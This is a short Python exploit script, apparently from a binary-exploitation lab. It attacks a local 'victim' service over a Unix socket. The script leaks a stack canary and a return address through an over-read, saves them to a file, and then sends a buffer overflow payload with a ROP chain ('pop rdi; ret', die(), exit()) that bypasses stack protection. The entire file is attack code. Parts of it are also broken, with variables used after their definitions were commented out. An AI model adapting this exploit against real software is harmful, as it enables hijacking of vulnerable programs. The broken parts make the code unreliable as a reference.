import os
import socket
import struct
import sys

#create a socket to read from file handler
sock = os.getenv("HOME") + "/victim.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock)

#send string and length to server
strg = b'A' * 16 + b'\n280\n'
s.send(strg)
data = s.recv(1024)

b_canary = []
canary = []
ret_addr = []
bin_addr = []
#valuebyte = ''

for i in range(len(data)):
	this_byte = hex(ord(data[i]))
	if len(this_byte) == 3:
		this_byte = '0x0' + this_byte[2]
	#valuebyte += this_byte + '\t'
	if i>23 and i<32:
		canary.append(this_byte)
		b_canary.append(ord(data[i]))
	if i>39 and i<48:
		ret_addr.append(this_byte)
	if (i+1)%8 == 0:
		print(valuebyte)
		valuebyte = ''

# get binary base address (entry location)
#os.system('readelf -a victim | grep -i "entry" > tmp')
#binadd = open('tmp', 'r').read()
#binadd = binadd.split(':')

canary.reverse()
canary_str = ''
for c in range(8):
	canary_str += canary[c]

ret_addr.reverse()
ret_addr_str = ''
for r in range(8):
	ret_addr_str += ret_addr[r]

write_to_file = '0x' + canary_str.replace('0x','') + '\n0x' + ret_addr_str.replace('0x','') + '\n' + binadd[1].strip() + '\n'

filename = 'leaked_data.txt'
with open(filename, 'w') as file_object:
    file_object.write(write_to_file)

strg = b'pawned!\0' # pawned!
strg+= b'AAAAAAAA'  # AAAAAAAA
strg+= b'BBBBBBBB'  # BBBBBBBB
# canary
for c in range(8):
        strg += struct.pack('B',b_canary[c])
strg+= b'\xde\xad\xbe\xef\x00\x00\x00\x00' # deadbeef
#strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
strg+= b'\x33\x4f\x55\x55\x55\x55\x00\x00' # 0x555555554000 + 0xf33 -- pop rdi; ret
strg+= b'\xca\xb4\xb9\xf7\xff\x7f\x00\x00' # HOME
#strg+= b'\x40\xe5\xff\xff\xff\x7f\x00\x00' # string address
#strg+= b'\xc0\xe4\xff\xff\xff\x7f\x00\x00' # string address
strg+= b'\xea\x4a\x55\x55\x55\x55\x00\x00' # die()
strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()

#send string and length to server
strg += b'\n88\n'
#print(strg)
s.send(strg)
data = s.recv(1024)
s.close()
